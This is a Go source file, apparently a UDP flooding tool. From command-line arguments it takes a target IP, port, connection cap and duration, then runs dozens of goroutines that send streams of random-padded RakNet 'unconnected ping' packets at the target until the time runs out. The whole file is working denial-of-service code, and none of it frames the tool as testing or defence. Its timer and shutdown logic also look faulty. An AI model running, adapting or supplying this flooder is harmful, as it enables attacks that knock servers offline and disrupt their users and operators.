package main

import (
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
	"math/rand"
	"net"
)

type Config struct {
	Target        string
	MaxConnections int
	Duration      time.Duration
}

type HandshakeManager struct {
	config       *Config
	stopChan     chan struct{}
	wg           sync.WaitGroup
	totalReqs    int32
	failedReqs   int32
}

func NewHandshakeManager(config *Config) *HandshakeManager {
	return &HandshakeManager{
		config:   config,
		stopChan: make(chan struct{}),
	}
}

func (hm *HandshakeManager) Start() {
	workers := 50
	if hm.config.MaxConnections < 1000 {
		workers = 20
	}

	for i := 0; i < workers; i++ {
		hm.wg.Add(1)
		go hm.handshakeWorker()
	}

	// Finaliza al cumplirse la duración
	if hm.config.Duration > 0 {
		hm.wg.Add(1)
		go hm.durationTimer()
	}

	hm.wg.Wait()
}

func (hm *HandshakeManager) Stop() {
	close(hm.stopChan)
	hm.wg.Wait()
}

func (hm *HandshakeManager) durationTimer() {
	defer hm.wg.Done()
	select {
	case <-time.After(hm.config.Duration):
		hm.Stop()
	case <-hm.stopChan:
		return
	}
}

func (hm *HandshakeManager) handshakeWorker() {
	defer hm.wg.Done()
	for {
		select {
		case <-hm.stopChan:
			return
		default:
			active := atomic.LoadInt32(&hm.totalReqs) - atomic.LoadInt32(&hm.failedReqs)
			if active >= int32(hm.config.MaxConnections) {
				time.Sleep(15 * time.Millisecond)
				continue
			}
			err := hm.sendHandshake()
			if err != nil {
				atomic.AddInt32(&hm.failedReqs, 1)
				time.Sleep(10 * time.Millisecond)
			}
		}
	}
}

func (hm *HandshakeManager) sendHandshake() error {
	c, err := net.Dial("udp", hm.config.Target)
	if err != nil {
		return err
	}
	defer c.Close()

	// Packet ID for UNCONNECTED_PING is 0x01. El resto puede ser random, clientId y padding.
	packet := make([]byte, 25)
	packet[0] = 0x01
	rand.Read(packet[1:])
	_, err = c.Write(packet)
	atomic.AddInt32(&hm.totalReqs, 1)
	return err
}

func main() {
	if len(os.Args) < 5 {
		os.Exit(1)
	}

	ip := os.Args[1]
	port := os.Args[2]
	maxConn, err := strconv.Atoi(os.Args[3])
	if err != nil {
		os.Exit(1)
	}

	seconds, err := strconv.Atoi(os.Args[4])
	if err != nil {
		os.Exit(1)
	}

	config := &Config{
		Target:        ip + ":" + port,
		MaxConnections: maxConn,
		Duration:      time.Duration(seconds) * time.Second,
	}

	manager := NewHandshakeManager(config)
	manager.Start()
}
